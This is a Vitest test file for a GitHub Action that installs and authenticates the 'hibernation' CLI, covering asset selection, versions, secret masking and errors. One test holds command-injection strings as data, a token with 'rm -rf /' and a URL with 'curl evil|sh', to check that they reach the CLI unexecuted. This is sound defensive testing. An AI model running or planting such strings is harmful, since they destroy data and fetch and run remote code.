import { beforeEach, describe, expect, it, vi } from 'vitest';

vi.mock('@actions/core');
vi.mock('@actions/tool-cache');
vi.mock('node:child_process');

const core = await import('@actions/core'),
  tc = await import('@actions/tool-cache'),
  { execFileSync } = await import('node:child_process'),
  { run } = await import('../run'),
  setPlatform = (platform: string, arch: string) => {
    vi.spyOn(process, 'platform', 'get').mockReturnValue(
      platform as NodeJS.Platform
    );
    vi.spyOn(process, 'arch', 'get').mockReturnValue(
      arch as NodeJS.Architecture
    );
  },
  setInputs = (inputs: Record<string, string>) => {
    vi.mocked(core.getInput).mockImplementation((name) => inputs[name] ?? '');
  };

beforeEach(() => {
  vi.resetAllMocks();
  vi.restoreAllMocks();
  setPlatform('linux', 'x64');
  setInputs({});
  vi.mocked(tc.downloadTool).mockResolvedValue('/tmp/cli.tar.gz');
  vi.mocked(tc.extractTar).mockResolvedValue('/tmp/cli');
});

describe('platform/arch asset resolution', () => {
  it.each([
    ['linux', 'x64', 'hibernation-linux-x86-64-gnu.tar.gz'],
    ['linux', 'arm64', 'hibernation-linux-arm64-gnu.tar.gz'],
    ['darwin', 'x64', 'hibernation-macos-x86-64.tar.gz'],
    ['darwin', 'arm64', 'hibernation-macos-arm64.tar.gz']
  ])('%s/%s -> %s', async (platform, arch, asset) => {
    setPlatform(platform, arch);
    await run();
    expect(tc.downloadTool).toHaveBeenCalledWith(
      `https://github.com/ProfiiDev/hibernation/releases/latest/download/${asset}`
    );
    expect(tc.extractTar).toHaveBeenCalledWith('/tmp/cli.tar.gz');
    expect(core.addPath).toHaveBeenCalledWith('/tmp/cli');
    expect(core.setFailed).not.toHaveBeenCalled();
  });

  it.each([
    ['win32', 'x64', 'Unsupported platform: win32'],
    ['freebsd', 'arm64', 'Unsupported platform: freebsd'],
    ['linux', 'ia32', 'Unsupported architecture: ia32'],
    ['darwin', 'riscv64', 'Unsupported architecture: riscv64']
  ])('%s/%s fails', async (platform, arch, message) => {
    setPlatform(platform, arch);
    await run();
    expect(core.setFailed).toHaveBeenCalledWith(message);
    expect(tc.downloadTool).not.toHaveBeenCalled();
  });
});

describe('version', () => {
  it('uses latest when input is empty', async () => {
    await run();
    expect(tc.downloadTool).toHaveBeenCalledWith(
      expect.stringContaining('/releases/latest/download/')
    );
  });

  it('uses the tag download path for a pinned version', async () => {
    setInputs({ version: 'v0.1.0' });
    await run();
    expect(tc.downloadTool).toHaveBeenCalledWith(
      'https://github.com/ProfiiDev/hibernation/releases/download/v0.1.0/hibernation-linux-x86-64-gnu.tar.gz'
    );
  });
});

describe('configuration', () => {
  it('authenticates with url and token', async () => {
    setInputs({ token: 'tok', url: 'https://cache.example.com' });
    await run();
    expect(execFileSync).toHaveBeenCalledExactlyOnceWith(
      'hibernation',
      ['auth', '--url', 'https://cache.example.com', 'tok'],
      { stdio: 'inherit' }
    );
    expect(core.setSecret).toHaveBeenCalledWith('tok');
    expect(core.setFailed).not.toHaveBeenCalled();
  });

  it('only sets the url without a token', async () => {
    setInputs({ url: 'https://cache.example.com' });
    await run();
    expect(execFileSync).toHaveBeenCalledExactlyOnceWith(
      'hibernation',
      ['set-url', 'https://cache.example.com'],
      { stdio: 'inherit' }
    );
    expect(core.setSecret).not.toHaveBeenCalled();
  });

  it('warns and skips when only a token is given', async () => {
    setInputs({ token: 'tok' });
    await run();
    expect(execFileSync).not.toHaveBeenCalled();
    expect(core.warning).toHaveBeenCalledWith(
      'Token provided without URL, skipping configuration'
    );
    expect(core.setSecret).toHaveBeenCalledWith('tok');
  });

  it('does nothing without url or token', async () => {
    await run();
    expect(execFileSync).not.toHaveBeenCalled();
    expect(core.exportVariable).not.toHaveBeenCalled();
    expect(core.setFailed).not.toHaveBeenCalled();
  });

  it('exports and masks the signing key', async () => {
    setInputs({ 'signing-key': 'key:abc' });
    await run();
    expect(core.setSecret).toHaveBeenCalledWith('key:abc');
    expect(core.exportVariable).toHaveBeenCalledWith(
      'HIBERNATION_SIGNING_KEY',
      'key:abc'
    );
  });

  it('masks secrets before anything can log them', async () => {
    setInputs({ 'signing-key': 'key', token: 'tok', url: 'u' });
    await run();
    const [first] = vi.mocked(core.setSecret).mock.invocationCallOrder;
    expect(first).toBeLessThan(
      vi.mocked(core.info).mock.invocationCallOrder[0]
    );
    expect(first).toBeLessThan(
      vi.mocked(execFileSync).mock.invocationCallOrder[0]
    );
  });

  it('passes a malicious token as a single argument (no shell)', async () => {
    const token = 'x; rm -rf / $(whoami) `id` && echo pwned';
    setInputs({ token, url: 'https://a.example; curl evil|sh' });
    await run();
    expect(execFileSync).toHaveBeenCalledWith(
      'hibernation',
      ['auth', '--url', 'https://a.example; curl evil|sh', token],
      { stdio: 'inherit' }
    );
    expect(vi.mocked(execFileSync).mock.calls[0][2]).not.toHaveProperty(
      'shell'
    );
  });
});

describe('failures', () => {
  it('fails when download fails', async () => {
    vi.mocked(tc.downloadTool).mockRejectedValue(new Error('404'));
    await run();
    expect(core.setFailed).toHaveBeenCalledWith('404');
    expect(core.addPath).not.toHaveBeenCalled();
  });

  it('fails when extraction fails', async () => {
    vi.mocked(tc.extractTar).mockRejectedValue(new Error('bad tar'));
    await run();
    expect(core.setFailed).toHaveBeenCalledWith('bad tar');
  });

  it('fails when the cli command fails and does not export the key', async () => {
    setInputs({ 'signing-key': 'k', token: 'tok', url: 'u' });
    vi.mocked(execFileSync).mockImplementation(() => {
      throw Object.assign(
        new Error('Command failed: hibernation auth --url u tok'),
        { status: 2 }
      );
    });
    await run();
    expect(core.setFailed).toHaveBeenCalledWith(
      'hibernation auth failed (exit code 2)'
    );
    expect(vi.mocked(core.setFailed).mock.calls[0][0]).not.toContain('tok');
    expect(core.exportVariable).not.toHaveBeenCalled();
  });

  it('reports unknown exit code when the cli cannot be spawned', async () => {
    setInputs({ url: 'u' });
    vi.mocked(execFileSync).mockImplementation(() => {
      throw new Error('spawn hibernation ENOENT');
    });
    await run();
    expect(core.setFailed).toHaveBeenCalledWith(
      'hibernation set-url failed (exit code unknown)'
    );
  });

  it('stringifies non-Error throws', async () => {
    vi.mocked(tc.downloadTool).mockRejectedValue('boom');
    await run();
    expect(core.setFailed).toHaveBeenCalledWith('boom');
  });
});

describe('entry point', () => {
  it('runs on import and routes errors to setFailed', async () => {
    setPlatform('win32', 'x64');
    await import('../index');
    await vi.waitFor(() => {
      expect(core.setFailed).toHaveBeenCalledWith(
        'Unsupported platform: win32'
      );
    });
  });
});
